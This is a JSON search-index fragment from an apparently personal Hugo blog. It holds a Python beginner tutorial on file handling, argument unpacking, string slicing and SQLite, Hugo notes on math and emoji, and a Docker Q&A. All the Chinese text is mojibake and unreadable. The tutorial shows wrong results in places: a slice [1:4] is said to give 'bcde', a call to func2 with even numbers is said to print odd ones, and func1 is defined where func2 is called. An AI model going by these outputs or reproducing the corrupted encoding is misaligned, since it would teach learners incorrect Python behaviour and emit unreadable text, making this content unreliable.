è¨˜æ†¶æ–¹å¼ï¼š 1 2 3 4 wã€w+ # æœƒæ¸…é™¤åŸæª”æ¡ˆå…§å®¹ rã€r+ # æª”æ¡ˆæŒ‡æ¨™æŒ‡å‘æª”æ¡ˆé–‹é ­ aã€a+ # æª”æ¡ˆæŒ‡æ¨™æŒ‡å‘æª”æ¡ˆçµå°¾ + # å¯è®€å¯å¯«æ¨¡å¼ æª”æ¡ˆé–‹å•Ÿ - open() æ“ä½œå¾Œéœ€é—œæª” - close() 1 2 3 4 5 6 7 8 9 10 content = \u0026#34;\u0026#34;\u0026#34;Hello Python ä¸­æ–‡æ¸¬è©¦ abc 123456.321654987 $@^$%^@#$!@#$ \u0026#34;\u0026#34;\u0026#34; file = open(\u0026#34;myfile.txt\u0026#34;, \u0026#34;w\u0026#34;) ... file.close() è®€å– - read() myfile.txt 1 testtest123 test.py 1 2 3 file = open(r\u0026#34;myfile.txt\u0026#34;, \u0026#34;r\u0026#34;) print(file.read()) file.close() åŸ·è¡Œå›å‚³ 1 \u0026gt;\u0026gt;\u0026gt; testtest123 å¯«å…¥ - write() test.py 1 2 3 file = open(r\u0026#34;myfile.txt\u0026#34;, \u0026#34;w\u0026#34;) file.write(\u0026#39;testtest123\u0026#39;) file.close() myfile.txt 1 testtest123 ç§»å‹•è®€å¯«é ­ - seek() 1 2 3 4 5 6 7 8 9 10 11 12 content = \u0026#34;\u0026#34;\u0026#34;Hello Python\u0026#34;\u0026#34;\u0026#34; file = open(r\u0026#34;myfile.txt\u0026#34;, \u0026#34;r\u0026#34;) # file.write(content) file_content = file.read() print(file_content) file.seek(0) # ç§»å‹•è®€å¯«é ­åˆ°é–‹é ­ file_content = file.read() print(file_content) file.close() åŸ·è¡Œå›å‚³ 1 2 \u0026gt;\u0026gt;\u0026gt; Hello Python \u0026gt;\u0026gt;\u0026gt; Hello Python è®€å‡ºè¡Œæ•¸ - readline() \u0026amp; readlines() readlineï¼šä¸€è¡Œä¸€è¡Œè®€ readlinesï¼šä¸€æ¬¡è®€å…¨éƒ¨è¡Œæ•¸ poem.txt 1 2 3 4 æ¾ä¸‹å•ç«¥å­ è¨€å¸«æ¡è—¥å» åªåœ¨æ­¤å±±ä¸­ é›²æ·±ä¸çŸ¥è™• read.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # readlines() ä¸€æ¬¡è®€å‡º f = open(r\u0026#39;poem.txt\u0026#39;, \u0026#39;r\u0026#39;) lines = f.readlines() for line in lines: print(line, end=\u0026#39;\u0026#39;) f.seek(0) # è®€å¯«é ­å›åˆ°é–‹é ­ # readline() ä¸€è¡Œä¸€è¡Œè®€ line = f.readline() while line != \u0026#39;\u0026#39;: print(line, end=\u0026#39;\u0026#39;) line = f.readline() f.close() åŸ·è¡Œå›å‚³ï¼š 1 2 3 4 \u0026gt;\u0026gt;\u0026gt; æ¾ä¸‹å•ç«¥å­ \u0026gt;\u0026gt;\u0026gt; è¨€å¸«æ¡è—¥å» \u0026gt;\u0026gt;\u0026gt; åªåœ¨æ­¤å±±ä¸­ \u0026gt;\u0026gt;\u0026gt; é›²æ·±ä¸çŸ¥è™• ä½¿ç”¨ with-open-as åšè®€æª”æ¡ˆçš„å‹•ä½œ - (æ¨è–¦) 1 2 with open(r\u0026#34;poem.txt\u0026#34;, \u0026#34;r\u0026#34;) as file: print(file.read()) åŸ·è¡Œå›å‚³ï¼š 1 2 3 4 \u0026gt;\u0026gt;\u0026gt; æ¾ä¸‹å•ç«¥å­ \u0026gt;\u0026gt;\u0026gt; è¨€å¸«æ¡è—¥å» \u0026gt;\u0026gt;\u0026gt; åªåœ¨æ­¤å±±ä¸­ \u0026gt;\u0026gt;\u0026gt; é›²æ·±ä¸çŸ¥è™• åˆªé™¤æª”æ¡ˆ - remove() ä½¿ç”¨osæ¨¡çµ„ ä½¿ç”¨os.path.existsåˆ¤æ–·æª”æ¡ˆæ˜¯å¦å­˜åœ¨ 1 2 3 4 5 6 7 8 import os file = r\u0026#34;poem2.txt\u0026#34; if os.path.exists(file): os.remove(file) else: print(\u0026#39;No exists file\u0026#39;) æ–°å¢ç›®éŒ„ - mkdir() ä½¿ç”¨os.path.existsåˆ¤æ–·æª”æ¡ˆæ˜¯å¦å­˜åœ¨ 1 2 3 4 5 6 7 8 import os dir = \u0026#34;testDir\u0026#34; if os.path.exists(dir): print(\u0026#34;Direct is exists\u0026#34;) else: os.mkdir(dir) åˆªé™¤ç©ºç›®éŒ„ - rmdir() ä½¿ç”¨os.path.existsåˆ¤æ–·æª”æ¡ˆæ˜¯å¦å­˜åœ¨ é™å®šç©ºç›®éŒ„ 1 2 3 4 5 6 7 8 import os dir = \u0026#34;testDir\u0026#34; if os.path.exists(dir): os.rmdir(dir) else: print(\u0026#34;Direct is undefine\u0026#34;) åˆªé™¤ç›®éŒ„èˆ‡åº•ä¸‹å…¨éƒ¨æª”æ¡ˆ - rmtree() ä½¿ç”¨shell utilityæ¨¡çµ„ - shutil éœ€è¬¹æ…ä½¿ç”¨é¿å…åˆªéŒ¯ç›®éŒ„ 1 2 3 import shutil shutil.rmtree(\u0026#34;testDir\u0026#34;) Python èªæ³•ç­†è¨˜ å…©å€‹è®Šæ•¸äº¤æ›å€¼(Python Only) 1 2 3 4 x = 3 y = 8 x,y = y,x # äº¤æ›å…©å€‹è®Šæ•¸çš„å€¼ print(x,y) é–‹é ­å®£å‘Šç·¨ç¢¼æ–¹å¼å¯ç›´æ¥å¼·è½‰(Python Only) 1 2 3 4 # -*- coding: utf-8 -*- # è½‰utf-8 print(\u0026#34;å“ˆå›‰\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026#34;å“ˆå›‰\u0026#34; Pythonå‡½æ•¸å¸¶å…¥åƒæ•¸æ–¹å¼ åƒæ•¸ä»¥tupleå‚³å…¥functionã€‚ 1 2 3 4 5 6 def func1(*args): print(args) func2(1,3,5,7,9) \u0026gt;\u0026gt;\u0026gt; (1, 3, 5, 7, 9) åƒæ•¸ä»¥tupleæ‹†è§£ï¼Œé€²functionåœ¨çµ„åˆå›tupleã€‚ 1 2 3 4 5 6 def func2(*args): print(args) func2(*(2,4,6,8,10)) \u0026gt;\u0026gt;\u0026gt; (1, 3, 5, 7, 9) åƒæ•¸ä»¥dictå‚³å…¥functionã€‚ 1 2 3 4 5 6 def func3(**kwargs): print(kwargs) func3(even=(2,4,6,8), odd=(1,3,5,7,9)) \u0026gt;\u0026gt;\u0026gt; {\u0026#39;even\u0026#39;: (2, 4, 6, 8), \u0026#39;odd\u0026#39;: (1, 3, 5, 7, 9)} åƒæ•¸ä»¥dictæ‹†è§£ï¼Œé€²functionåœ¨çµ„åˆå›dict(éœ€ç‚ºåƒæ•¸æŒ‡å®šé—œéµå­—)(é—œéµå­—åƒæ•¸)ã€‚ 1 2 3 4 5 6 def func4(**kwargs): print(kwargs) func4(**{\u0026#34;even\u0026#34;:(2,4,6,8), \u0026#34;odd\u0026#34;:(1,3,5,7,9)}) \u0026gt;\u0026gt;\u0026gt; {\u0026#39;even\u0026#39;: (2, 4, 6, 8), \u0026#39;odd\u0026#39;: (1, 3, 5, 7, 9)} å…¶ä»– å­—ä¸²é‹ç®—(Python Only) inï¼šæ˜¯å¦å«æœ‰ 1 2 3 # in \u0026#34;or\u0026#34; in \u0026#34;forever\u0026#34; \u0026gt;\u0026gt;\u0026gt; True not inï¼šæ˜¯å¦ä¸å«æœ‰ 1 2 3 # not in \u0026#34;abc\u0026#34; not in \u0026#34;forever\u0026#34; \u0026gt;\u0026gt;\u0026gt; False å–å­—ä¸²çš„ç‰¹å®šä½ç½®å­—å…ƒ æ ¼å¼ï¼šé–‹å§‹é»:çµæŸé»:é–“éš” 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # å–ç¬¬1~4å€‹å­—å…ƒ(ä¸å«ç¬¬4å€‹) \u0026#34;abcdefg\u0026#34;[1:4] \u0026gt;\u0026gt;\u0026gt; \u0026#39;bcde\u0026#39; # å–ç¬¬1~4å€‹å­—å…ƒ(æ¯æ¬¡é–“éš”2å€‹) \u0026#34;abcdefg\u0026#34;[1:4:2] \u0026gt;\u0026gt;\u0026gt; \u0026#39;bd\u0026#39; # å–æœ€å¾Œä¸€å€‹å­—å…ƒ \u0026#34;abcdefg\u0026#34;[-1] \u0026gt;\u0026gt;\u0026gt; \u0026#39;g\u0026#39; # åè½‰ \u0026#34;abcdefg\u0026#34;[::-1] \u0026gt;\u0026gt;\u0026gt; \u0026#39;gfedcba\u0026#39; SQLite é—œè¯å¼è³‡æ–™åº«(ç‰ˆæœ¬3.31.1) ç³»çµ±å‘½ä»¤(.é–‹é ­)ï¼ŒSQLå‘½ä»¤(;çµå°¾)\nç³»çµ±å‘½ä»¤ é€²å…¥è³‡æ–™åº« æŒ‡ä»¤ï¼šsqlite3 è³‡æ–™åº«åç¨± 1 2 3 sqlite3 test01.sqlite sqlite\u0026gt; è³‡æ–™åº« (DB) sqliteæŒ‡ä»¤æ–°å¢è³‡æ–™åº« 1 .open test01 sqliteæŒ‡ä»¤æŸ¥è©¢æ‰€æœ‰è³‡æ–™åº« 1 .databases è³‡æ–™è¡¨ (Table) æ¬„ä½è¨­å®š èªªæ˜ NM (None)å¯å¦å…è¨±ç©ºå€¼ PK (Primary Key)æ˜¯å¦ç‚ºä¸»éµ AI (A.I)æ˜¯å¦è‡ªå‹•ç”¢ç”Ÿå€¼ U (Unique)ä¸é‡è¤‡éµ æ–°å¢è³‡æ–™è¡¨ 1 create table studen(ID Integer, name String, score Integer); sqliteæŒ‡ä»¤æŸ¥è©¢æ‰€æœ‰è³‡æ–™è¡¨ 1 .table æ›´æ–°è³‡æ–™è¡¨ SQLèªæ³•ï¼šALTER TABLE è³‡æ–™åº« ADD COLUMN æ¬„ä½åç¨± è³‡æ–™å‹æ…‹\n1 ALTER TABLE student ADD COLUMN address String; è³‡æ–™æ“ä½œ (CRUD:Create/Read/Update/Delete) æ’å…¥è³‡æ–™ SQLèªæ³•ï¼šINSERT INTO è³‡æ–™è¡¨ VALUES(æ¬„ä½1, æ¬„ä½2, æ¬„ä½3)\n1 INSERT INTO student values(1001, \u0026#34;Ben\u0026#34;, 88); æŸ¥è©¢è³‡æ–™ SQLèªæ³•ï¼šSELECT æ¬„ä½ FROM è³‡æ–™è¡¨ [WHERE æ¢ä»¶];\n1 SELECT Score from student WHERE ID = 1001; åˆªé™¤è³‡æ–™ SQLèªæ³•ï¼šDELETE FROM è³‡æ–™è¡¨ [WHERE æ¢ä»¶];\n1 DELETE from student WHERE ID = 1001; ä¿®æ”¹è³‡æ–™ SQLèªæ³•ï¼šUPDATE è³‡æ–™è¡¨ SET æ¬„ä½åç¨± = å€¼ [WHERE æ¢ä»¶];\n1 UPDATE student SET Name = \u0026#34;Amanda\u0026#34; WHERE ID = 1001; ","date":"2020-03-15T00:00:00Z","image":"https://live.staticflickr.com/65535/52283398446_ed21ce37f2_o.png","permalink":"https://wayneblog.ga/2020-03-15/python-beginner-tutorial/","title":"æ™ºæ…§å•†æ¥­Pythonæ•¸æ“šåˆ†æèˆ‡æ‡‰ç”¨ç­(ç‰ˆæœ¬3.*)"},{"content":"Mathematical notation in a Hugo project can be enabled by using third party JavaScript libraries.\nIn this example we will be using KaTeX\nCreate a partial under /layouts/partials/math.html Within this partial reference the Auto-render Extension or host these scripts locally. Include the partial in your templates like so: 1 2 3 {{ if or .Params.math .Site.Params.math }} {{ partial \u0026#34;math.html\u0026#34; . }} {{ end }} To enable KaTex globally set the parameter math to true in a project\u0026rsquo;s configuration To enable KaTex on a per page basis include the parameter math: true in content files Note: Use the online reference of Supported TeX Functions\nExamples Block math: $$ \\varphi = 1+\\frac{1} {1+\\frac{1} {1+\\frac{1} {1+\\cdots} } } $$\n","date":"2019-03-08T00:00:00Z","permalink":"https://wayneblog.ga/2019-03-08/math-typesetting/","title":"Math Typesetting"},{"content":"Emoji can be enabled in a Hugo project in a number of ways.\nThe emojify function can be called directly in templates or Inline Shortcodes.\nTo enable emoji globally, set enableEmoji to true in your site\u0026rsquo;s configuration and then you can type emoji shorthand codes directly in content files; e.g.\nğŸ™ˆ :see_no_evil: ğŸ™‰ :hear_no_evil: ğŸ™Š :speak_no_evil:\nThe Emoji cheat sheet is a useful reference for emoji shorthand codes.\nN.B. The above steps enable Unicode Standard emoji characters and sequences in Hugo, however the rendering of these glyphs depends on the browser and the platform. To style the emoji you can either use a third party emoji font or a font stack; e.g.\n1 2 3 .emoji { font-family: Apple Color Emoji, Segoe UI Emoji, NotoColorEmoji, Segoe UI Symbol, Android Emoji, EmojiSymbols; } ","date":"2019-03-05T00:00:00Z","image":"https://wayneblog.ga/2019-03-05/emoji-support/the-creative-exchange-d2zvqp3fpro-unsplash_huf941de4769045cdfa8c9ee7036519a2a_35369_120x120_fill_q75_box_smart1.jpg","permalink":"https://wayneblog.ga/2019-03-05/emoji-support/","title":"Emoji Support"},{"content":" åƒè€ƒç¶²ç«™\nä¸è«–æ˜¯ Googleã€Amazonã€å¾®è»Ÿã€VMware éƒ½ç´›ç´›æ“æˆ´ï¼ŒåŠ å…¥ Docker å’Œ Container æ‰€æ€èµ·çš„æ–°ä¸–ä»£é›²ç«¯è™›æ“¬åŒ–è¡Œåˆ—ï¼Œé€™ 2 é …æŠ€è¡“æˆç‚ºäº† IT ç•Œçš„æ–°é¡¯å­¸ã€‚Docker å’Œ Container åˆ°åº•æ˜¯ä»€éº¼ï¼Ÿä»¥ä¸‹ 10 å€‹ Q\u0026amp;A å‘Šè¨´ä½ ã€‚\nQ1ï¼šContainer æŠ€è¡“å’Œä¼ºæœå™¨è™›æ“¬åŒ–æ˜¯ä¸€æ¨£çš„æŠ€è¡“å—ï¼Ÿ\n**Aï¼š**ä¸æ˜¯ã€‚å…©è€…é›–ç„¶éƒ½å±¬æ–¼è™›æ“¬åŒ–çš„æŠ€è¡“ï¼Œç›®æ¨™éƒ½æ˜¯ç‚ºäº†å°‡ä¸€å¥—æ‡‰ç”¨ç¨‹å¼æ‰€éœ€çš„åŸ·è¡Œç’°å¢ƒæ‰“åŒ…èµ·ä¾†ï¼Œå»ºç«‹ä¸€å€‹å­¤ç«‹ç’°å¢ƒï¼Œæ–¹ä¾¿åœ¨ä¸åŒçš„ç¡¬é«”ä¸­ç§»å‹•ï¼Œä½†å…©è€…çš„é‹ä½œæ€ç¶­æˆªç„¶ä¸åŒã€‚ç°¡å–®ä¾†èªªï¼Œå¸¸è¦‹çš„å‚³çµ±è™›æ“¬åŒ–æŠ€è¡“å¦‚ vSphere æˆ– Hyper-V æ˜¯ä»¥ä½œæ¥­ç³»çµ±ç‚ºä¸­å¿ƒï¼Œè€Œ Container æŠ€è¡“å‰‡æ˜¯ä¸€ç¨®ä»¥æ‡‰ç”¨ç¨‹å¼ç‚ºä¸­å¿ƒçš„è™›æ“¬åŒ–æŠ€è¡“ã€‚\nå‚³çµ±è™›æ“¬åŒ–æŠ€è¡“å¾ä½œæ¥­ç³»çµ±å±¤ä¸‹æ‰‹ï¼Œç›®æ¨™æ˜¯å»ºç«‹ä¸€å€‹å¯ä»¥ç”¨ä¾†åŸ·è¡Œæ•´å¥—ä½œæ¥­ç³»çµ±çš„æ²™ç®±ç¨ç«‹åŸ·è¡Œç’°å¢ƒï¼Œç¿’æ…£ä»¥è™›æ“¬æ©Ÿå™¨(Virtual Machine)ä¾†ç¨±å‘¼ã€‚è€Œ Container æŠ€è¡“å‰‡æ˜¯ç›´æ¥å°‡ä¸€å€‹æ‡‰ç”¨ç¨‹å¼æ‰€éœ€çš„ç›¸é—œç¨‹å¼ç¢¼ã€å‡½å¼åº«ã€ç’°å¢ƒé…ç½®æª”éƒ½æ‰“åŒ…èµ·ä¾†å»ºç«‹æ²™ç®±åŸ·è¡Œç’°å¢ƒï¼Œç‚ºäº†å’Œå‚³çµ±è™›æ“¬åŒ–æŠ€è¡“ç”¢ç”Ÿçš„è™›æ“¬æ©Ÿå™¨å€åˆ†ï¼ŒContainer æŠ€è¡“ç”¢ç”Ÿçš„ç’°å¢ƒå°±ç¨±ç‚º Containerã€‚\nQ2ï¼šä¸€èˆ¬å¸¸è¦‹çš„è™›æ“¬æ©Ÿå™¨å’Œ Container æœ‰ä½•ä¸åŒï¼Ÿ\n**Aï¼š**æœ€æ˜é¡¯çš„å·®åˆ¥æ˜¯ï¼Œè™›æ“¬æ©Ÿå™¨éœ€è¦å®‰è£ä½œæ¥­ç³»çµ±(å®‰è£ Guest OS)æ‰èƒ½åŸ·è¡Œæ‡‰ç”¨ç¨‹å¼ï¼Œè€Œ Container å…§ä¸éœ€è¦å®‰è£ä½œæ¥­ç³»çµ±å°±èƒ½åŸ·è¡Œæ‡‰ç”¨ç¨‹å¼ã€‚Container æŠ€è¡“ä¸æ˜¯åœ¨ OS å¤–ä¾†å»ºç«‹è™›æ“¬ç’°å¢ƒï¼Œè€Œæ˜¯åœ¨ OS å…§çš„æ ¸å¿ƒç³»çµ±å±¤ä¾†æ‰“é€ è™›æ“¬åŸ·è¡Œç’°å¢ƒï¼Œé€éå…±ç”¨ Host OS çš„ä½œæ³•ï¼Œå–ä»£ä¸€å€‹ä¸€å€‹ Guest OS çš„åŠŸç”¨ã€‚Container ä¹Ÿå› æ­¤è¢«ç¨±ç‚ºæ˜¯ OS å±¤çš„è™›æ“¬åŒ–æŠ€è¡“ã€‚\nQ3ï¼šç‚ºä½• Container æ˜¯è¼•é‡ç´šè™›æ“¬åŒ–æŠ€è¡“ï¼Ÿ\n**Aï¼š**å› ç‚º Container æŠ€è¡“æ¡å–å…±ç”¨ Host OS çš„ä½œæ³•ï¼Œè€Œä¸éœ€åœ¨æ¯ä¸€å€‹ Container å…§åŸ·è¡Œ Guest OSï¼Œå› æ­¤å»ºç«‹ Container ä¸éœ€è¦ç­‰å¾…ä½œæ¥­ç³»çµ±é–‹æ©Ÿæ™‚é–“ï¼Œä¸ç”¨ 1 åˆ†é˜æˆ–å¹¾ç§’é˜å°±å¯ä»¥å•Ÿç”¨ï¼Œé æ¯”éœ€è¦æ•¸åˆ†é˜ç”šè‡³æ•¸ååˆ†é˜æ‰èƒ½é–‹å•Ÿçš„å‚³çµ±è™›æ“¬æ©Ÿå™¨ä¾†çš„å¿«ã€‚\nQ4ï¼šContainer æŠ€è¡“æ˜¯å…¨æ–°çš„æŠ€è¡“å—ï¼Ÿ\n**Aï¼š**ä¸æ˜¯ï¼Œæ—©åœ¨ 1982 å¹´ï¼ŒUnix ç³»çµ±å…§å»ºçš„ chroot æ©Ÿåˆ¶ä¹Ÿæ˜¯ä¸€ç¨® Container æŠ€è¡“ã€‚å…¶ä»–å¦‚ 1998 å¹´çš„ FreeBSD jailsã€2005 å¹´å‡ºç¾çš„ Solaris Zones å’Œ OpenVZï¼Œæˆ–åƒæ˜¯ Windows ç³»çµ± 2004 å¹´å°±æœ‰çš„ Sandboxie æ©Ÿåˆ¶éƒ½å±¬æ–¼åœ¨ä½œæ¥­ç³»çµ±å…§å»ºç«‹å­¤ç«‹è™›æ“¬åŸ·è¡Œç’°å¢ƒçš„ä½œæ³•ï¼Œéƒ½å¯ç¨±ç‚ºæ˜¯ Container çš„æŠ€è¡“ã€‚\nç›´åˆ° 2013 å¹´ï¼ŒdotCloud é€™å®¶ PaaS æœå‹™å…¬å¸é–‹æºé‡‹å‡ºäº†ä¸€å¥—å°‡ Container æ¨™æº–åŒ–çš„å¹³è‡º Dockerï¼Œå¤§å—æ­¡è¿ï¼Œæ‰€ä»¥ï¼ŒdotCloud æ±ºå®šä»¥ Docker ç‚ºåæˆç«‹æ–°å…¬å¸åŠ›æ¨ã€‚\nQ5ï¼šDocker å¦‚ä½•å¯¦ç¾ Container æ¨™æº–åŒ–ï¼Ÿ\n**Aï¼š**Docker æ¡ç”¨äº† aufs æª”æ¡ˆç³»çµ±ä¾†è¨­è¨ˆä¸€å€‹å¯ä»¥å±¤å±¤å †ç–Šçš„ Container æ˜ è±¡æª”ï¼Œå°‡ Container å…§çš„æ‰€æœ‰ç¨‹å¼(åŒ…æ‹¬æ‡‰ç”¨ç¨‹å¼ã€ç›¸é—œå‡½å¼åº«ã€è¨­å®šæª”)ï¼Œéƒ½æ‰“åŒ…é€² Docker æ˜ è±¡æª”ï¼Œä¸¦ä¸”æä¾›äº†ä¸€å€‹ Dockerfile è¨­å®šæª”ä¾†è¨˜éŒ„å»ºç«‹ Container éç¨‹çš„æ¯ä¸€å€‹æ­¥é©ŸåŒ…æ‹¬åƒæ•¸ã€‚åªè¦åœ¨ä»»ä½•æ”¯æ´ Docker å¹³è‡ºçš„ç’°å¢ƒä¸­ï¼Œå°±å¯ä»¥å¾é€™å€‹æ˜ è±¡æª”ä¾†å»ºç«‹å‡ºä¸€å€‹ä¸€æ¨¡ä¸€æ¨£çš„ Container ä¾†åŸ·è¡ŒåŒä¸€å€‹æ‡‰ç”¨ç¨‹å¼ã€‚å¦‚æ­¤ä¸€ä¾†ï¼Œæ‡‰ç”¨ç¨‹å¼ç­‰æ–¼æ˜¯å¯ä»¥é€é Docker æ˜ è±¡æª”ï¼Œæˆ–ç”šè‡³åªéœ€è¦ Dockerfileï¼Œå°±èƒ½å°‡ç¨‹å¼åŸ·è¡Œç’°å¢ƒå¸¶è‘—èµ°ï¼Œç§»å‹•åˆ°ä»»ä½•æ”¯æ´ Docker çš„ç’°å¢ƒä¸­ã€‚Docker å…¬å¸ä¹Ÿé‡‹å‡º APIï¼Œå¯ä»¥ç”¨ä¾†æ§åˆ¶æ‰€æœ‰çš„ Container ç›¸é—œæŒ‡ä»¤ï¼Œä»»ä½•äººåªè¦ä½¿ç”¨åŒä¸€å¥— Dockerï¼Œå°±ç­‰æ–¼æœ‰äº†åŒä¸€å¥—ç®¡ç†å’Œå»ºç«‹ Container çš„æ–¹æ³•ï¼Œä¹Ÿå°±ç­‰åŒæ–¼å°‡ Container é‹ç”¨æ¨™æº–åŒ–äº†ã€‚\nQ6ï¼šä¸€å€‹ Container æ˜ è±¡æª”å…§å¯ä»¥å®‰è£å¤šå°‘æ‡‰ç”¨ç¨‹å¼ï¼Ÿ\n**Aï¼š**ä¸€å€‹ Container çš„æ˜ è±¡æª”å…§å¯ä»¥å®‰è£å¤šæ”¯ç¨‹å¼ï¼Œä¾‹å¦‚åŒæ™‚å®‰è£ Ubuntuã€Apacheã€MySQLã€Node.jsã€Ruby ç­‰ã€‚ä¸éï¼ŒDocker å®˜æ–¹å»ºè­°ï¼Œä¸€éš»ç¨‹å¼å®‰è£åœ¨ä¸€å€‹ Container å…§ï¼Œå†æŠŠé€™äº› Container ç–Šèµ·ä¾†æä¾›ä¸€å€‹å®Œæ•´çš„æœå‹™ã€‚\nDocker ç¨±é€™æ˜¯ä¸€ç¨® Microservices(å¾®æœå‹™)çš„æ–°è»Ÿé«”æ¶æ§‹ï¼Œå°‡çµ„æˆä¸€å€‹æ‡‰ç”¨ç³»çµ±çš„æ¯ä¸€å€‹ Stackï¼Œæ‹†è§£æˆè¨±å¤šå°å‹æœå‹™ï¼Œä¾‹å¦‚ Apache æœå‹™ã€MySQL æœå‹™ã€Node.js æœå‹™ã€Ruby æœå‹™ï¼Œæ¯ä¸€å€‹æœå‹™éƒ½æ˜¯åŒ…åœ¨ Container è£¡çš„ä¸€éš»ç¨‹å¼ï¼Œä¾‹å¦‚ MySQL æœå‹™å°±æ˜¯éƒ¨ç½²åœ¨ Container å…§çš„ MySQLã€‚\né€™éº¼åšçš„å¥½è™•æ˜¯å¯ä»¥å»ºç«‹ä¸€å€‹é¬†æ•£è€¦åˆçš„å½ˆæ€§æ‡‰ç”¨ç¨‹å¼æ¶æ§‹ï¼Œä¹Ÿèƒ½è¼•æ˜“åœ°æŠ½æ›å…¶ä¸­ä¸€å€‹ Containerï¼Œä¾‹å¦‚è¦å‡ç´š MySQLï¼Œåªéœ€è¦é‡æ–°è¼‰å…¥æ–°ç‰ˆ MySQL çš„ Container æ˜ è±¡æª”ï¼Œå°±å¯ä»¥å®Œæˆè³‡æ–™åº«å‡ç´šï¼Œä¸ç”¨å°‡æ•´å¥—æ‡‰ç”¨ç³»çµ±åœæ©Ÿã€‚\nQ7ï¼šContainer å…§ä¸æ˜¯ä¸éœ€è¦ OSï¼Œç‚ºä½•éœ€è¦ OS çš„åŸºç¤æ˜ è±¡æª”ï¼Ÿ\n**Aï¼š**OS åŸºç¤æ˜ è±¡æª”çš„ç”¨é€”æ˜¯è®“ Container æ“æœ‰é€™ OS çš„æª”æ¡ˆç³»çµ±ï¼Œä¾‹å¦‚ä½¿ç”¨ ubuntu åŸºç¤æ˜ è±¡æª”å°±å¯ä»¥è®“ Container å»ºç«‹ ubuntu çš„æ ¹ç›®éŒ„æ¶æ§‹ï¼Œè€Œä¸æ˜¯ç”¨ä¾†åŸ·è¡Œä¸€å€‹ OS åŸ·è¡Œå¯¦ä¾‹ã€‚\nQ8ï¼šDocker å° Devops æœ‰ä½•å¹«åŠ©ï¼Ÿ\n**Aï¼š**å› ç‚º Docker é€é Dockerfile ä¾†è¨˜éŒ„å»ºç«‹ Container æ˜ è±¡æª”çš„æ¯ä¸€å€‹æ­¥é©Ÿï¼Œå¯ä»¥å°‡å»ºç«‹æ‡‰ç”¨ç¨‹å¼åŸ·è¡Œç’°å¢ƒçš„éç¨‹å’Œé…ç½®åƒæ•¸ï¼Œå®Œæ•´åœ°è¨˜éŒ„ä¸‹ä¾†ã€‚é–‹ç™¼äººå“¡å’Œç¶­é‹äººå“¡ä¹‹é–“å¯ä»¥åˆ©ç”¨ Dockerfile ä¾†æºé€šå°åŸ·è¡Œç’°å¢ƒçš„è¨è«–ã€‚ç”šè‡³çµåˆç‰ˆæœ¬æ§åˆ¶æœå‹™å¦‚ GitHubï¼Œå¯ä»¥è®“ Dockerfile å…·å‚™ç‰ˆæœ¬æ§åˆ¶åŠŸèƒ½ï¼Œèƒ½å°‡åŸºç¤æ¶æ§‹ç¨‹å¼åŒ–(Infrastructure as code)ä¾†ç®¡ç†ã€‚\nQ9ï¼šå¯ä»¥åœ¨ Windows Server ç’°å¢ƒä¸­åŸ·è¡Œ Docker å—ï¼Ÿ\n**Aï¼š**é‚„ä¸è¡Œã€‚ç›®å‰ Docker åªèƒ½åœ¨ Linux å¹³è‡ºä¸ŠåŸ·è¡Œï¼Œä½†æ˜¯å¾®è»Ÿ 10 æœˆä¸­å‰›å®£å¸ƒè¦åœ¨ä¸‹ä¸€æ³¢ Windows Server æ”¹ç‰ˆæ™‚å…§å»º Docker å¼•æ“ï¼Œæœªä¾†åŒä¸€ä»½ Docker æ˜ è±¡æª”èƒ½å¦è·¨ Linux å’Œ Windows OSï¼Œé‚„éœ€å¾…å¾®è»Ÿæ­éœ²æ›´å¤šç´°ç¯€æ‰èƒ½å¾—çŸ¥ã€‚\nQ10ï¼šåœ¨è‡ºç£ï¼Œå¦‚ä½•æ‰¾åˆ°æ‡‚ Docker æŠ€è¡“çš„äººï¼Ÿ\n**Aï¼š**ç›®å‰ Docker å…¬å¸é‚„æœªåœ¨è‡ºè¨­é»ï¼Œä½†æœ‰ä¸€å€‹ Docker Taipei ç¤¾ç¾¤ï¼Œæˆå“¡æˆªè‡³ 10 æœˆæœ‰ 383 äººã€‚\nDocker Taipei ä¹Ÿé è¨ˆé…åˆ Docker ç¸½å…¬å¸èˆ‰è¾¦çš„å…¨çƒ HackDay æ´»å‹•ï¼Œåœ¨ 11 æœˆ 1 æ—¥èˆ‰è¾¦è‡ºåŒ—å ´ HackDayã€‚åƒåŠ ä½œå“å°‡ç›´æ¥ç™¼å¸ƒåˆ°ç¾åœ‹å’Œå…¨çƒ Docker é–‹ç™¼è€…ä¸€èµ·è©•æ¯”ï¼Œçå“æ˜¯æ˜å¹´åˆ°ç¾åœ‹åƒåŠ  Docker æŠ€è¡“å¤§æœƒçš„è³‡æ ¼ã€‚\n","date":"2014-10-28T00:00:00Z","image":"https://live.staticflickr.com/65535/52564831824_2754e80d0b_o.png","permalink":"https://wayneblog.ga/2014-10-28/docker-10-qa/","title":"10 å€‹ Q\u0026A å¿«é€Ÿèªè­˜ Docker"}]